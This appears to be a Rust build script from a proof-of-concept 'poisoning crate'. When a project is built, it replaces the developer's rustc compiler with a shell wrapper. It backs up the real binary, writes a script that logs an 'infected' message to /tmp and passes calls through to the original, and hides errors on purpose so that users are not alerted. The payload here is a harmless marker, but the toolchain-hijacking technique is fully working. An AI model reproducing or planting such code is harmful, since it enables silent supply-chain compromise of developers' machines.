use std::{io::Write,fs,env,path::Path};
fn main(){
    let _=sub();// supress all unsuccessful error which might alert people that this script is malicious.
}
fn sub()->Result<(),Box<dyn std::error::Error>>{
    let cargo=env::var("CARGO")?;
    let cargo_dir=Path::new(&cargo);
    let bin=cargo_dir.parent().ok_or(std::io::Error::new(std::io::ErrorKind::Other, "no!"))?;
    let rustc=env::var("RUSTC")?;
    let orc="old_".to_string()+&rustc;
    let rcloc=bin.join(rustc);
    let ocloc=bin.join(orc);
    if !ocloc.exists() && rcloc.exists(){
        fs::copy(&rcloc,&ocloc)?;// use copy to preserve 'x' permissions.
        let mut f=fs::File::create(rcloc)?;
        f.write_all(b"#!/bin/sh\necho 'The rustc has been \"poisoned\" by poisoning crate, which suggests that, your computer is not strong enough to defend such attack' > /tmp/rustc_infected\necho \"If you're using Linux, your rustc perhaps works just fine\" >> /tmp/rustc_infected\necho \"but windows users may suffer from executing a linux-only script.\" >> /tmp/rustc_infected\nexec ")?;
        f.write_all(ocloc.to_str().ok_or(std::io::Error::new(std::io::ErrorKind::Other, "oh no!"))?.as_bytes())?;
        f.write_all(b" $*")?
    }
    Ok(())
}
